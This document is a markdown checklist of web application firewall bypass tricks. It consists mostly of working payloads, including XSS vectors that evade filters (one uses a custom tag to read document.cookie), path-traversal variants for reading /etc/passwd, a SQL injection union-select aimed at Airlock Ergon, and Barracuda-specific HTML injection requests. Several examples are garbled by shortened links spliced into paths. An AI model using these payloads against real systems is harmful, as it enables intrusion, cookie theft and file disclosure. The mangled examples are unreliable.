



# Bypass checklist

## Generic checklist


- [ ]  Base64 encoding our payload 
```
(/?q=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=_)
```

- [ ]  ASPX removes % not followed by two hex characters 
```
(https://lnkd.in/eBsjhAqr /etc/paswd)
```


- [ ]  We can use spaces to fool a WAF 
```
(<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">)
```


- [ ]  Backslashes in filtered words 
```
(https://lnkd.in/eCXt9J_S /etc/pa\swd)
```

- [ ]  Quotes and * https://lnkd.in/eCXt9J_S /etc/pa*swd
https://lnkd.in/eCXt9J_S /etc/pa**swd
https://lnkd.in/eCXt9J_S /etc/pa's'wd
https://lnkd.in/eCXt9J_S /etc/pa"s"wd


- [ ]  Wildcards (https://lnkd.in/eCXt9J_S /e??/p????)

- [ ]  Replace spaces with / (<svg/onload>)

- [ ]  Custom tags ([https://lnkd.in/eC5Zwwmn<CUSTOM+id%3Dx+onfocus%3Dalert(document.cookie) tabindex=1>#x](https://lnkd.in/exBUDGNr) )


- [ ]  Using different language chars
– e.g. ē instead of e

## Airlock Ergon

```php
%C0%80'+union+select+col1,col2,col3+from+table+--+
```

Every space here is replaced by a + and we have the %C0 and %80 url encoded values at the beginning of our attack http://vector.by [@Sec Consult](https://lnkd.in/eHqUMyDa)

## Barracuda

```php
<body style="height:1000px" onwheel="alert(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
```

A smart bypass making use of several tricks. The first line will use the onwheel event handler which is not filtered in Barracuda. We also have a very smart use of the url encoded characters on the third line. Great discoveries by [@WAFNinja](https://waf.ninja/)

```php
GET /cgi-mod/index.cgi?&primary_tab=ADVANCED&secondary_tab=test_backup_server&content_only=1&&&backup_port=21&&backup_username=%3E%22%3Ciframe%20src%3Dhttp%3A//https://lnkd.in/eCUn9ndT
Host: http://favoritewaf.com
User-Agent: Mozilla/5.0 (compatible; MSIE5.01; Windows NT)
```





==We can see several smart tricks being used here by [@Global-Evolution](https://www.exploit-db.com/?author=2016) to achieve HTMLi==

```php
<a href=j%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:open()>clickhere
```

And finally this amazing hacker makes smart use of the urlencoded value %0A which they place between every character of javascript. %0A translates to a linefeed. 

And many more over at [https://github.com/0xInfection/Awesome-WAF#known-bypasses](https://github.com/0xInfection/Awesome-WAF#known-bypasses)